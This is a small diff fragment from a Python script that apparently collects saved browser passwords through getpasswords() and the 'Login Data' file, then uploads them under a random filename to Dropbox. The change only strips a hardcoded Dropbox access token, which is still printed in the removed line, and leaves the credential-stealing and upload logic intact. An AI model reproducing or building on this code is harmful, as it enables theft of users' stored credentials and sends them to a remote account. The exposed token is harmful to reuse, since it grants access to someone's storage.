@@ -59,7 +59,7 @@ def send():
 
     jsonData = getpasswords()
     #Get your access code form dropbox to use it here.
-    dbx=dropbox.Dropbox('xZ1QuOK6iBAAAAAAAAAATLG-Uk8R8aC57_ydn4KZOAwXe2dOo7sQ3auJobdJRjlq')
+    dbx=dropbox.Dropbox()
     file_from="c:\prog\Login Data"
     x=random.randint(1,500)
     z=str(x)+'.txt'
